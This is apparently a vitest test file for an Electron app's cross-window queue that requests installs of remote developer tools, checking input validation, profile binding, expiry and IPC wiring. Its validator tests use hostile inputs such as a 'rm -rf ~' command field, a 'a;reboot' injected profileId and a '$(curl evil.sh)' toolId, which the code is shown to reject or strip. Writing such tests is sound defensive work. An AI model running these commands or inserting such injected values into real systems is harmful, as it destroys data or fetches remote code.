/**
 * T0412 (PLAN-037 E): main's cross-window install queue — `remote-tools:request-install` /
 * `remote-tools:take-pending-install` (both local-only ipcMain.handle in main.ts, logic in
 * src/lib/remote-tools/install-request.ts). Profiles and windows are fakes.
 */
import * as fs from 'fs'
import * as path from 'path'
import { describe, expect, it, vi } from 'vitest'
import {
  createRemoteToolInstallIpc,
  PENDING_INSTALL_TTL_MS,
  PendingRemoteToolInstalls,
  validateRemoteToolInstallRequest,
  type RemoteToolInstallIpcDeps,
} from '../../src/lib/remote-tools/install-request'

const PROFILES: Record<string, { type: string }> = {
  'wsl-ubuntu': { type: 'remote' },
  'ssh.box_2': { type: 'remote' },
  local: { type: 'local' },
}

function setup(over: Partial<RemoteToolInstallIpcDeps> = {}, now = () => 1_000) {
  const queue = new PendingRemoteToolInstalls(now)
  const deps: RemoteToolInstallIpcDeps = {
    getProfile: vi.fn(async (id: string) => PROFILES[id] ?? null),
    openProfileWindow: vi.fn(async () => ({ alreadyOpen: false, windowIds: ['w-1'] })),
    notifyProfileWindows: vi.fn(),
    ...over,
  }
  return { queue, deps, ipc: createRemoteToolInstallIpc(queue, deps) }
}

const connected = (profileId: string | null) => ({ profileId, connected: true })

describe('validateRemoteToolInstallRequest', () => {
  it('accepts the three fields and copies nothing else', () => {
    expect(validateRemoteToolInstallRequest({ profileId: 'wsl-ubuntu', toolId: 'claude', kind: 'install', command: 'rm -rf ~' }))
      .toEqual({ ok: true, request: { profileId: 'wsl-ubuntu', toolId: 'claude', kind: 'install' } })
    expect(validateRemoteToolInstallRequest({ profileId: 'ssh.box_2', toolId: 'claude', kind: 'update' }).ok).toBe(true)
  })

  it.each([
    ['not an object', null, 'Invalid install request'],
    ['string', 'wsl-ubuntu', 'Invalid install request'],
    ['missing profileId', { toolId: 'git', kind: 'install' }, 'Invalid profileId'],
    ['numeric profileId', { profileId: 42, toolId: 'git', kind: 'install' }, 'Invalid profileId'],
    ['empty profileId', { profileId: '', toolId: 'git', kind: 'install' }, 'Invalid profileId'],
    ['path profileId', { profileId: '../etc', toolId: 'git', kind: 'install' }, 'Invalid profileId'],
    ['spaced profileId', { profileId: 'a b', toolId: 'git', kind: 'install' }, 'Invalid profileId'],
    ['shell profileId', { profileId: 'a;reboot', toolId: 'git', kind: 'install' }, 'Invalid profileId'],
    ['unknown toolId', { profileId: 'p', toolId: 'nmap', kind: 'install' }, 'Invalid toolId'],
    ['cased toolId', { profileId: 'p', toolId: 'Claude', kind: 'install' }, 'Invalid toolId'],
    ['proto toolId', { profileId: 'p', toolId: '__proto__', kind: 'install' }, 'Invalid toolId'],
    ['missing kind', { profileId: 'p', toolId: 'git' }, 'Invalid kind'],
    ['other kind', { profileId: 'p', toolId: 'git', kind: 'uninstall' }, 'Invalid kind'],
  ])('rejects %s', (_label, raw, error) => {
    const result = validateRemoteToolInstallRequest(raw)
    expect(result).toEqual({ ok: false, error })
  })

  it('never echoes the rejected value', () => {
    const result = validateRemoteToolInstallRequest({ profileId: 'x', toolId: '$(curl evil.sh)', kind: 'install' })
    expect(JSON.stringify(result)).not.toContain('evil')
  })
})

describe('remote-tools:request-install', () => {
  it('queues the request, opens / focuses the profile window, pings it', async () => {
    const { ipc, queue, deps } = setup()
    await expect(ipc.requestInstall({ profileId: 'wsl-ubuntu', toolId: 'gh', kind: 'install' })).resolves.toEqual({ ok: true })
    expect(deps.openProfileWindow).toHaveBeenCalledWith('wsl-ubuntu')
    expect(deps.notifyProfileWindows).toHaveBeenCalledWith('wsl-ubuntu')
    expect(queue.has('wsl-ubuntu')).toBe(true)
  })

  it('invalid parameters: nothing looked up, queued or opened', async () => {
    const { ipc, queue, deps } = setup()
    await expect(ipc.requestInstall({ profileId: '../x', toolId: 'gh', kind: 'install' })).resolves.toEqual({ ok: false, error: 'Invalid profileId' })
    await expect(ipc.requestInstall({ profileId: 'wsl-ubuntu', toolId: 'gh', kind: 'purge' })).resolves.toEqual({ ok: false, error: 'Invalid kind' })
    expect(deps.getProfile).not.toHaveBeenCalled()
    expect(deps.openProfileWindow).not.toHaveBeenCalled()
    expect(queue.size).toBe(0)
  })

  it('unknown or local profile is refused', async () => {
    const { ipc, queue, deps } = setup()
    await expect(ipc.requestInstall({ profileId: 'nope', toolId: 'git', kind: 'install' })).resolves.toEqual({ ok: false, error: 'Profile not found: nope' })
    await expect(ipc.requestInstall({ profileId: 'local', toolId: 'git', kind: 'install' })).resolves.toEqual({ ok: false, error: 'Not a remote profile' })
    expect(deps.openProfileWindow).not.toHaveBeenCalled()
    expect(queue.size).toBe(0)
  })

  it('window could not be opened (remote-unreachable) ⇒ error, request dropped', async () => {
    const { ipc, queue, deps } = setup({ openProfileWindow: vi.fn(async () => ({ alreadyOpen: false, windowIds: [], error: 'remote-unreachable' })) })
    await expect(ipc.requestInstall({ profileId: 'wsl-ubuntu', toolId: 'git', kind: 'install' })).resolves.toEqual({ ok: false, error: 'remote-unreachable' })
    expect(queue.size).toBe(0)
    expect(deps.notifyProfileWindows).not.toHaveBeenCalled()
  })

  it('open throws ⇒ error, request dropped', async () => {
    const { ipc, queue } = setup({ openProfileWindow: vi.fn(async () => { throw new Error('boom') }) })
    await expect(ipc.requestInstall({ profileId: 'wsl-ubuntu', toolId: 'git', kind: 'install' })).resolves.toEqual({ ok: false, error: 'boom' })
    expect(queue.size).toBe(0)
  })

  it('a newer request for the same profile replaces the older one', async () => {
    const { ipc } = setup()
    await ipc.requestInstall({ profileId: 'wsl-ubuntu', toolId: 'claude', kind: 'install' })
    await ipc.requestInstall({ profileId: 'wsl-ubuntu', toolId: 'gh', kind: 'install' })
    expect(ipc.takePendingInstall(connected('wsl-ubuntu'))).toEqual({ toolId: 'gh', kind: 'install' })
    expect(ipc.takePendingInstall(connected('wsl-ubuntu'))).toBeNull()
  })

  it('a failed open does not drop a newer request queued meanwhile', async () => {
    let release: (v: unknown) => void = () => {}
    const open = vi.fn()
      .mockImplementationOnce(() => new Promise((r) => { release = r }))
      .mockResolvedValue({ alreadyOpen: true })
    const { ipc } = setup({ openProfileWindow: open })
    const first = ipc.requestInstall({ profileId: 'wsl-ubuntu', toolId: 'claude', kind: 'install' })
    await vi.waitFor(() => expect(open).toHaveBeenCalledTimes(1))
    await ipc.requestInstall({ profileId: 'wsl-ubuntu', toolId: 'uv', kind: 'install' })
    release({ error: 'remote-unreachable' })
    await expect(first).resolves.toEqual({ ok: false, error: 'remote-unreachable' })
    expect(ipc.takePendingInstall(connected('wsl-ubuntu'))).toEqual({ toolId: 'uv', kind: 'install' })
  })

  it('requests for different profiles are kept apart', async () => {
    const { ipc } = setup()
    await ipc.requestInstall({ profileId: 'wsl-ubuntu', toolId: 'claude', kind: 'install' })
    await ipc.requestInstall({ profileId: 'ssh.box_2', toolId: 'claude', kind: 'update' })
    expect(ipc.takePendingInstall(connected('ssh.box_2'))).toEqual({ toolId: 'claude', kind: 'update' })
    expect(ipc.takePendingInstall(connected('wsl-ubuntu'))).toEqual({ toolId: 'claude', kind: 'install' })
  })
})

describe('remote-tools:take-pending-install', () => {
  async function queued() {
    const s = setup()
    await s.ipc.requestInstall({ profileId: 'wsl-ubuntu', toolId: 'codex', kind: 'install' })
    return s
  }

  it('only the window bound to that profile can take it; taking deletes it', async () => {
    const { ipc, queue } = await queued()
    expect(ipc.takePendingInstall(connected('ssh.box_2'))).toBeNull()
    expect(ipc.takePendingInstall(connected('local'))).toBeNull()
    expect(ipc.takePendingInstall(connected(null))).toBeNull()
    expect(ipc.takePendingInstall({ profileId: undefined, connected: true })).toBeNull()
    expect(queue.has('wsl-ubuntu')).toBe(true)
    expect(ipc.takePendingInstall(connected('wsl-ubuntu'))).toEqual({ toolId: 'codex', kind: 'install' })
    expect(queue.has('wsl-ubuntu')).toBe(false)
    expect(ipc.takePendingInstall(connected('wsl-ubuntu'))).toBeNull()
  })

  it('a window of the profile that is not connected cannot take it (and does not consume it)', async () => {
    const { ipc, queue } = await queued()
    expect(ipc.takePendingInstall({ profileId: 'wsl-ubuntu', connected: false })).toBeNull()
    expect(queue.has('wsl-ubuntu')).toBe(true)
  })

  it('hands out tool + kind only', async () => {
    const { ipc } = await queued()
    expect(Object.keys(ipc.takePendingInstall(connected('wsl-ubuntu'))!).sort()).toEqual(['kind', 'toolId'])
  })

  it('an expired request is dropped on take', async () => {
    let now = 1_000
    const { ipc, queue } = setup({}, () => now)
    await ipc.requestInstall({ profileId: 'wsl-ubuntu', toolId: 'git', kind: 'install' })
    now += PENDING_INSTALL_TTL_MS + 1
    expect(ipc.takePendingInstall(connected('wsl-ubuntu'))).toBeNull()
    expect(queue.size).toBe(0)
  })
})

describe('main.ts wiring', () => {
  const main = fs.readFileSync(path.resolve(__dirname, '..', 'main.ts'), 'utf8')

  it('both channels are local-only ipcMain.handle (not proxied to the bat-server)', async () => {
    expect(main).toMatch(/ipcMain\.handle\('remote-tools:request-install'/)
    expect(main).toMatch(/ipcMain\.handle\('remote-tools:take-pending-install'/)
    const { PROXIED_CHANNELS } = await import('../remote/protocol')
    expect(PROXIED_CHANNELS.has('remote-tools:request-install')).toBe(false)
    expect(PROXIED_CHANNELS.has('remote-tools:take-pending-install')).toBe(false)
  })

  it('take is bound to the sender window profile, request reuses app:open-new-instance', () => {
    const take = main.slice(main.indexOf("ipcMain.handle('remote-tools:take-pending-install'"))
    expect(take.slice(0, 600)).toContain('getWindowIdByWebContents(event.sender)')
    expect(main).toContain("ipcMain.handle('app:open-new-instance', async (_event, profileId: string) => openProfileWindows(profileId))")
    expect(main).toMatch(/openProfileWindow: openProfileWindows/)
  })
})
